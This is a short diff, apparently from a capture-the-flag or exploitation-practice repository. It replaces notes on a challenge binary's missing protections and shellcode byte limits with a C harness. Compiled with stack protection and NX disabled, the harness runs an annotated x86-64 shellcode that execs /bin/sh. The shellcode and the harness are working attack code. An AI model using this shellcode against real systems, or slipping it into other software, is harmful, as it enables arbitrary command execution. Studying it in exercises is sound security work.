@@ -1,25 +1,10 @@
-linux-vdso.so.1 (0x00007fff34fd3000)
-libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f36dd315000)
-/lib64/ld-linux-x86-64.so.2 (0x00007f36dd51b000)
+//gcc -fno-stack-protector -z execstack -no-pie
+#include <stdio.h>
+#include <string.h>
 
-Stack:    No canary found
-NX:       NX disabled
-PIE:      No PIE (0x400000)
-RWX:      Has RWX segments
-
-
-
-
-buffer has 240 bytes (30 vars*8)
-read 96 bytes into buffer 
-first 96 bytes cannot have 0x90, 0x6b, 0x69, 0x72, 0x74, 0x6f
-96/6=16 lines
-divide the shellcode into lines of 6
-first 16 lines must start with 0xc 0x87 0x63
-after the 112 byte(16 bytes from the 16th line), the shellcode will be executed.
-This means we have to limit the shellcode within 112 bytes
-
-char shellcode[] =
+int main()
+{
+    char shellcode[] =
     "\x48\x31\xd2"                                  // xor    %rdx, %rdx
     "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
     "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
@@ -30,3 +15,8 @@ char shellcode[] =
     "\x48\x89\xe6"                                  // mov    %rsp, %rsi
     "\xb0\x3b"                                      // mov    $0x3b, %al
     "\x0f\x05";                                     // syscall
+    int (*ret)() = (int (*)())shellcode;
+
+    ret();
+    return 0;
+}
